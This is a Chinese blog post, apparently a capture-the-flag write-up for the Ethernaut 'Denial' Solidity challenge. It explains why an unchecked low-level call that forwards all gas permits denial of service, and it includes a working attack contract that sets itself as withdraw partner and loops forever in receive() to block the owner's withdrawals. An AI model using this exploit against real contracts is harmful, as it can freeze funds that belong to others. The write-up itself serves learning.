---
title: 'ddos-2'
date: 2022-12-17 13:42:15
tags:
- '区块链技术'
- '智能合约安全'
categories:
- '智能合约安全'
---

<!-- more -->

#### 第二十关Denial 思路与POC

#### 目标: 阻止owner发起转账,并要求合约还有剩余资金

##### 先看代码:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
contract Denial {

    address public partner; // withdrawal partner - pay the gas, split the withdraw
    address public constant owner = address(0xA9E);
    uint timeLastWithdrawn;
    mapping(address => uint) withdrawPartnerBalances; // keep track of partners balances

    function setWithdrawPartner(address _partner) public {
        partner = _partner;
    }

    // withdraw 1% to recipient and 1% to owner
    function withdraw() public {
    //可以看到这个函数并没有防止重入攻击,但是题目要求题目还剩下资金.所以不能够用传统的重入攻击
     //每次能够提现合约余额的百分之一
        uint amountToSend = address(this).balance / 100;
       /*
       要了解的是call这种底层调用方法是没有gas限制的,而其他的transfer或send的gas限制是2300
       此处并没有检查call调用后的返回值,所以一旦call目标合约receive方法中有大量消耗gas的操作
       交易就会因为gas耗尽而回退.
       这样就导致了withdraw这个函数执行到了partner.call{value:amountToSend}("");之后永远无法正常往下执行
       */
        partner.call{value:amountToSend}("");
        payable(owner).transfer(amountToSend);
        // keep track of last withdrawal time
        timeLastWithdrawn = block.timestamp;
        withdrawPartnerBalances[partner] +=  amountToSend;
    }

    // allow deposit of funds
    receive() external payable {}

    // convenience function
    function contractBalance() public view returns (uint) {
        return address(this).balance;
    }
}
```

##### poc思路:point_right:：对于一个没有gas限制的call外部合约的函数,发起dos攻击(out of gas attack)是很简单的事情

```solidity
contract DenialHack {
    Denial  Denial = Denial(0x1bd442053Af3e571eBbe11809F3cd207A0466A45);

    constructor() public {
         Denial.setWithdrawPartner(address(this));
    }
  //接收到转账后开始进入死循环消耗交易的所有gas
    receive() external payable {
        while (true) {
        
        }
    }
}
```

